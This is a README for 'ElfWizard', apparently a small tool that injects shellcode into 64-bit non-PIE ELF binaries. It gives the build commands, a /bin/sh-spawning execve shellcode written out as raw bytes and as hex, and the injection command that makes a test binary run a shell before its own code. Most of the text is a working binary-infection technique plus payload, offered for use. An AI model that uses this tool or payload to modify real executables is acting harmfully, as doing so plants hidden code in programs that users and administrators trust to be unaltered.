# ElfWizard
A simple tool to inject shellcode into an ELF binary.

## Requirements
* gcc
* A 64 bits ELF binary (no PIE)

## Example
I will use test/test.c program for this example:
First we compile our binary:
```
gcc -o test/test test/test.c -fno-pie -no-pie
```

We compile ElfWizard:
```gcc
gcc -o elfwizard src/main.c src/misc.c src/elf.c -Iincludes/
```

We are ready to inject a shellcode, I choose a simple shellcode that starts /bin/sh (http://shell-storm.org/shellcode/files/shellcode-806.php) We need to convert the shellcode to a hex string before, we can do that with python for example:

```
print(b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05".hex())
```
We are ready to run ./elfwizard

```./elfwizard --inject 31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05 test/test
```

Now if we run test/test, /bin/sh will be executed before the expected program.